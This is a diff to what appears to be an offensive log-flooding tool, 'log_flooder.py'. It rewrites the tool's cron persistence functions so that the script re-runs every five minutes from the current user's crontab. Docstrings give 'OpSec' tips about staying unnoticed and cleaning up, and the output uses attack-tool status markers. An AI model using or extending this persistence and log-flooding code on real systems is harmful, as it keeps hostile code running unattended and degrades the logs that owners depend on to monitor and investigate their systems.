@@ -245,22 +245,62 @@ def flood_logs(rate: int, duration: int) -> None:
 
 # ---------------- CRON ----------------
 
-def persist(script):
-    job = f"*/5 * * * * python3 {script}\n"
-    current = subprocess.getoutput("crontab -l 2>/dev/null")
+def _python_bin() -> str:
+    """
+    Resolve the interpreter path from /proc/self/exe so we always persist the
+    exact binary currently running, not a possibly different PATH entry.
+    """
+    return str(Path("/proc/self/exe").resolve())
 
-    if job not in current:
-        subprocess.run(["crontab", "-"], input=current + job, text=True)
-        print("[+] Cron added")
+def persist(script_path: str) -> bool:
+    """
+    Add a user crontab entry to re-run *script_path* every 5 minutes.
 
-def unpersist(script):
-    job = f"*/5 * * * * python3 {script}\n"
-    current = subprocess.getoutput("crontab -l")
+    No root required — uses the current user's personal crontab.
 
-    subprocess.run(["crontab", "-"], input=current.replace(job, ""), text=True)
-    print("[+] Cron removed")
+    OpSec: crontab -l is visible to all users; remove with --unpersist
+    before cleanup.
+    """
+    cron_job = f"*/5 * * * * {_python_bin()} {script_path}\n"
+    try:
+        result  = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
+        current = result.stdout if result.returncode == 0 else ""
+
+        if cron_job.strip() in current:
+            print("[*] Cron entry already present — skipping")
+            return True
+
+        proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
+        proc.communicate(input=current + cron_job)
+        print(f"[+] Cron persistence added — runs every 5 min")
+        return True
+    except FileNotFoundError:
+        print("[-] crontab not found — is cron installed?")
+        return False
+    except Exception as exc:
+        print(f"[-] Cron setup failed: {exc}")
+        return False
+
+def unpersist(script_path: str) -> bool:
+    """
+    Remove the cron entry added by create_cron_persistence (cleanup).
+    """
+    cron_job = f"*/5 * * * * {_python_bin()} {script_path}\n"
+    try:
+        result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
+        if result.returncode != 0:
+            print("[*] No crontab found for this user")
+            return True
+        proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
+        proc.communicate(input=result.stdout.replace(cron_job, ""))
+        print("[+] Cron entry removed")
+        return True
+    except Exception as exc:
+        print(f"[-] Cron removal failed: {exc}")
+        return False
 
 # ---------------- CLI ------------------
+
 def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
         prog = "log_flooder.py",
